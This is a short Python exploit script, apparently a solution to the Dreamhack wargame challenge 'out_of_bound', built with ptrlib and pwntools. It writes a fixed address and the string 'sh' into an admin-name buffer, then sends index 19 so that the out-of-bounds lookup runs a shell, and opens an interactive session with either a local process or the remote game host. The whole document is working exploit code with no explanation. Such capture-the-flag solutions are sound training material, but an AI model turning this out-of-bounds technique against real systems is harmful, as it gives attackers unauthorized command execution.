#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./out_of_bound")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 11075)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    payload = b""
    payload += ptr.p32(0x804A0B0)
    payload += b"sh"
    io.sendlineafter("Admin name: ", payload)
    io.sendlineafter("What do you want?: ", str(19))

    io.interactive()
    return


if __name__ == "__main__":
    main()
